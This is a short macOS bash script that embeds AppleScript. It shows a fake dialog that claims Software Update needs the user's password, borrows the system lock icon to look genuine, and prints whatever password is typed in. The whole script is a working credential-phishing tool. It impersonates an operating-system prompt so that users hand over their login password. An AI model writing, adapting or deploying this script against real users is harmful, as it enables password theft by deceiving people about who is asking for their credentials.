#!/usr/bin/env bash

username=$(id -P $(stat -f%Su /dev/console) | awk -F '[:]' '{print $8}')

read -r -d '' applescriptCode <<'EOF'
   set uservar to do shell script "echo $username"
   set dialogText to text returned of (display dialog "Software Update is trying to authenticate user. Enter the password to allow this." with icon posix file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/LockedIcon.icns" with hidden answer default answer "")
   return dialogText
EOF

dialogText=$(osascript -e "$applescriptCode");

echo $dialogText;


